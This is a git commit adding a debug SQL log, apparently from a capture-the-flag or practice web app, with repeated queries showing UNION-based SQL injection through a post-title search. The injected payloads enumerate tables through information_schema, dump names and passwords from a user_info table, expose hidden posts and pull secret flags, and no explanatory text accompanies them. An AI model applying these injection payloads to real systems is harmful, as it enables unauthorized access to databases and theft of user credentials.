80cae14e07050d2bb8af610255c709e618c2b5ad
parkyejin0204-cpu <parkyejin0204@gmail.com>
2025-10-18 22:44:30 +0900

    a

--- html_sent/debug.sql
+++ html_sent/debug.sql
@@ -13,3 +13,25 @@ SELECT id, title, content FROM posts WHERE title LIKE '%' OR 1=1 UNION SELECT nu
 SELECT id, title, content FROM posts WHERE title LIKE '%' OR 1=1 UNION SELECT null, title, content FROM posts WHERE is_hidden = 1 ; --%' AND is_hidden = FALSE
 SELECT id, title, content FROM posts WHERE title LIKE '%' OR 1=1 UNION SELECT null, title, content FROM posts WHERE is_hidden = 1 ;--%' AND is_hidden = FALSE
 SELECT id, title, content FROM posts WHERE title LIKE '%' OR 1=1 UNION SELECT id, title, content FROM posts WHERE is_hidden = 1 ;--%' AND is_hidden = FALSE
+SELECT id, title, content FROM posts WHERE title LIKE '%' OR 1=1 UNION SELECT id, title, content FROM posts WHERE is_hidden = 1 ;--%' AND is_hidden = FALSE
+SELECT id, title, content FROM posts WHERE title LIKE '%' OR 1=1 UNION SELECT null, table_name, null FROM information_schema.tables WHERE table_schema = DATABASE() -- -%' AND is_hidden = FALSE
+SELECT id, title, content FROM posts WHERE title LIKE '%' OR 1=1 UNION SELECT null, name, passwd FROM user_info ;--%' AND is_hidden = FALSE
+SELECT id, title, content FROM posts WHERE title LIKE '%' OR 1=1 UNION SELECT null, id, flag FROM flags WHERE is_secret = TRUE ;--%' AND is_hidden = FALSE
+SELECT id, title, content FROM posts WHERE title LIKE '%' OR 1=1 UNION SELECT null, id, flag FROM flags WHERE is_secret = TRUE ;--%' AND is_hidden = FALSE
+SELECT id, title, content FROM posts WHERE title LIKE '%' OR 1=1 UNION SELECT id, title, content FROM posts WHERE is_hidden = 1 ;--%' AND is_hidden = FALSE
+SELECT id, title, content FROM posts WHERE title LIKE '%' OR 1=1 UNION SELECT id, title, content FROM posts WHERE is_hidden = 1 ;--%' AND is_hidden = FALSE
+SELECT id, title, content FROM posts WHERE title LIKE '%' OR 1=1 UNION SELECT id, title, content FROM posts WHERE is_hidden = 1 ;--%' AND is_hidden = FALSE
+SELECT id, title, content FROM posts WHERE title LIKE '%' OR 1=1 UNION SELECT null, table_name, null FROM information_schema.tables WHERE table_schema = DATABASE() -- -%' AND is_hidden = FALSE
+SELECT id, title, content FROM posts WHERE title LIKE '%' OR 1=1 UNION SELECT null, name, passwd FROM user_info ;--%' AND is_hidden = FALSE
+SELECT id, title, content FROM posts WHERE title LIKE '%' OR 1=1 UNION SELECT null, id, flag FROM flags WHERE is_secret = TRUE ;--%' AND is_hidden = FALSE
+SELECT id, title, content FROM posts WHERE title LIKE '%' OR 1=1 UNION SELECT null, id, flag FROM flags WHERE is_secret = TRUE ;--%' AND is_hidden = FALSE
+SELECT id, title, content FROM posts WHERE title LIKE '%' OR 1=1 UNION SELECT null, table_name, null FROM information_schema.tables WHERE table_schema = DATABASE() -- -%' AND is_hidden = FALSE
+SELECT id, title, content FROM posts WHERE title LIKE '%' OR 1=1 UNION SELECT null, table_name, null FROM information_schema.tables WHERE table_schema = DATABASE() -- -%' AND is_hidden = FALSE
+SELECT id, title, content FROM posts WHERE title LIKE '%' OR 1=1 UNION SELECT null, table_name, null FROM information_schema.tables WHERE table_schema = DATABASE() -- -%' AND is_hidden = FALSE
+SELECT id, title, content FROM posts WHERE title LIKE '%' OR 1=1 UNION SELECT null, table_name, null FROM information_schema.tables WHERE table_schema = DATABASE() -- -%' AND is_hidden = FALSE
+SELECT id, title, content FROM posts WHERE title LIKE '%' OR 1=1 UNION SELECT null, table_name, null FROM information_schema.tables WHERE table_schema = DATABASE() -- -%' AND is_hidden = FALSE
+SELECT id, title, content FROM posts WHERE title LIKE '%' OR 1=1 UNION SELECT id, title, content FROM posts WHERE is_hidden = 1 ;--%' AND is_hidden = FALSE
+SELECT id, title, content FROM posts WHERE title LIKE '%' OR 1=1 UNION SELECT id, title, content FROM posts WHERE is_hidden = 1 ;--%' AND is_hidden = FALSE
+SELECT id, title, content FROM posts WHERE title LIKE '%' OR 1=1 UNION SELECT null, table_name, null FROM information_schema.tables WHERE table_schema = DATABASE() -- -%' AND is_hidden = FALSE
+SELECT id, title, content FROM posts WHERE title LIKE '%' OR 1=1 UNION SELECT null, id, flag FROM flags WHERE is_secret = TRUE ;--%' AND is_hidden = FALSE
+SELECT id, title, content FROM posts WHERE title LIKE '%' OR 1=1 UNION SELECT id, title, content FROM posts WHERE is_hidden = 1 ;--%' AND is_hidden = FALSE
